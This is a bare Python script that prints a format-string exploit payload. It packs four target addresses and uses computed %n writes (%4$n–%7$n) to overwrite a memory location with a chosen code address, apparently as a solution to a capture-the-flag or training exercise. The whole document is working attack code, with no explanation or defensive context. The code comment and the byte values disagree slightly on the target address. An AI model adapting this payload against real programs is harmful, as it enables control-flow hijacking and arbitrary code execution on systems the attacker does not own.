addr_1 = "\x38\x98\x04\x08"
addr_2 = "\x39\x98\x04\x08"
addr_3 = "\x3a\x98\x04\x08"
addr_4 = "\x3b\x98\x04\x08"

value_1 = 213
value_2 = 131
value_3 = 4
value_4 = 8

#0x80483d0

inject_1 = 256 + value_1 - (0x04 * 4)
inject_2 = 256 * 2 + value_2 - inject_1 - (0x04 * 4)
inject_3 = 256 * 3 + value_3 - inject_1 - inject_2 - (0x04 * 4)
inject_4 = 256 * 4 + value_4 - inject_1 - inject_2 - inject_3 - (0x04 * 4)

form = '%' + str(inject_1) + 'x%4$n'
form += '%' + str(inject_2) + 'x%5$n'
form += '%' + str(inject_3) + 'x%6$n'
form += '%' + str(inject_4) + 'x%7$n'

print(addr_1 + addr_2 + addr_3 + addr_4 + form)